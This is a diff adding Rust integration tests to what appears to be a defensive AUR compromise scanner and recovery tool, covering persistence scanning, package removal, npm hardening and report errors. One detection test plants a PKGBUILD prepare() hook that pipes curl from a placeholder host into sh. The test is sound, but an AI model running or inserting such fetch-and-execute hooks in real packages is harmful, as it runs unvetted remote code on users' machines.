@@ -940,6 +940,8 @@ fn persistence_decode_and_size_failures_mark_coverage_incomplete() {
     fs::create_dir_all(&systemd).unwrap();
     fs::write(systemd.join("oversized.service"), vec![b'x'; 1_048_577]).unwrap();
     fs::write(home.path().join(".bashrc"), [0xff, 0xfe, 0xfd]).unwrap();
+    fs::create_dir_all(home.path().join("cron")).unwrap();
+    fs::write(home.path().join("cron/undecodable"), [0xff, 0xfe]).unwrap();
 
     let output = Command::new(binary())
         .env("HOME", home.path())
@@ -958,6 +960,124 @@ fn persistence_decode_and_size_failures_mark_coverage_incomplete() {
     let json: Value = serde_json::from_str(&stdout[stdout.find('{').unwrap()..]).unwrap();
     assert_eq!(json["coverage_complete"], false);
     assert_eq!(json["files_skipped_oversize"], 1);
-    assert_eq!(json["roots_unreadable"], 1);
+    assert_eq!(json["roots_unreadable"], 2);
     assert_eq!(json["artifact_critical"], 0);
+}
+
+#[test]
+fn explicit_removal_verification_reports_only_installed_targets() {
+    let home = tempdir().unwrap();
+    let foreign = home.path().join("foreign.txt");
+    fs::write(&foreign, "beef\n").unwrap();
+    for (targets, expected) in [(vec!["absent"], 0), (vec!["absent", "beef"], 1)] {
+        let output = Command::new(binary())
+            .env("HOME", home.path())
+            .env("AUR_RESPONSE_DIR", home.path())
+            .env("AUR_TEST_FOREIGN_LIST", &foreign)
+            .args(["recovery", "remove-packages", "--verify", "--local"])
+            .args(targets)
+            .output()
+            .unwrap();
+        assert_eq!(output.status.code(), Some(expected), "{output:?}");
+        let stdout = String::from_utf8(output.stdout).unwrap();
+        assert!(!stdout.contains("  - absent"), "{stdout}");
+        assert!(!stdout.contains("Command: sudo pacman"), "{stdout}");
+        if expected == 1 {
+            assert!(stdout.contains("1 Atomic Arch package(s)"), "{stdout}");
+            assert!(stdout.contains("  - beef"), "{stdout}");
+        }
+        assert_eq!(fs::read_to_string(&foreign).unwrap(), "beef\n");
+    }
+}
+
+#[test]
+fn hardening_preserves_unterminated_npm_configuration() {
+    let home = tempdir().unwrap();
+    let path = home.path().join(".npmrc");
+    fs::write(&path, "registry=https://example.invalid").unwrap();
+    let run = |apply: bool| {
+        let mut command = Command::new(binary());
+        command
+            .env("HOME", home.path())
+            .env("AUR_RESPONSE_DIR", home.path())
+            .args(["recovery", "apply-hardening"]);
+        if apply {
+            command.arg("--apply");
+        }
+        command.output().unwrap()
+    };
+    assert_eq!(run(false).status.code(), Some(0));
+    assert_eq!(
+        fs::read_to_string(&path).unwrap(),
+        "registry=https://example.invalid"
+    );
+    assert_eq!(run(true).status.code(), Some(0));
+    assert_eq!(
+        fs::read_to_string(&path).unwrap(),
+        "registry=https://example.invalid\nignore-scripts=true\n"
+    );
+    assert_eq!(run(true).status.code(), Some(0));
+    assert_eq!(
+        fs::read_to_string(&path).unwrap(),
+        "registry=https://example.invalid\nignore-scripts=true\n"
+    );
+}
+
+#[test]
+fn maintainer_comment_does_not_suppress_independent_hook_evidence() {
+    let home = tempdir().unwrap();
+    let cache = home.path().join("cache/package");
+    fs::create_dir_all(&cache).unwrap();
+    let comment = "# Maintainer: encoded contact base64 -d\n";
+    for (body, expected) in [
+        ("", 0),
+        (
+            "prepare() { curl https://example.invalid/payload | sh; }\n",
+            1,
+        ),
+    ] {
+        let input = format!("{comment}{body}");
+        fs::write(cache.join("PKGBUILD"), &input).unwrap();
+        let output = Command::new(binary())
+            .env("HOME", home.path())
+            .env("AUR_RESPONSE_DIR", home.path())
+            .env("AUR_DEPS_SEARCH_PATHS", home.path().join("cache"))
+            .args(["scan", "similar-heuristics", "--local"])
+            .output()
+            .unwrap();
+        assert_eq!(output.status.code(), Some(expected), "{output:?}");
+        assert_eq!(fs::read_to_string(cache.join("PKGBUILD")).unwrap(), input);
+    }
+}
+
+#[test]
+fn report_publication_failure_is_not_silent_success() {
+    for blocked in ["directory", "state", "summary"] {
+        let home = tempdir().unwrap();
+        let reports = home.path().join("reports");
+        if blocked == "directory" {
+            fs::write(&reports, "preserve").unwrap();
+        } else {
+            fs::create_dir_all(&reports).unwrap();
+            fs::create_dir(reports.join(if blocked == "state" {
+                ".scan-state"
+            } else {
+                "latest-summary.json"
+            }))
+            .unwrap();
+        }
+        let output = Command::new(binary())
+            .env("HOME", home.path())
+            .env("AUR_RESPONSE_DIR", home.path())
+            .args(["recovery", "rotate-hints", "--quiet", "--json"])
+            .output()
+            .unwrap();
+        assert_eq!(output.status.code(), Some(3), "{blocked}: {output:?}");
+        assert!(String::from_utf8(output.stderr)
+            .unwrap()
+            .contains("cannot publish report"));
+        if blocked == "directory" {
+            assert_eq!(fs::read_to_string(&reports).unwrap(), "preserve");
+        }
+    }
 }
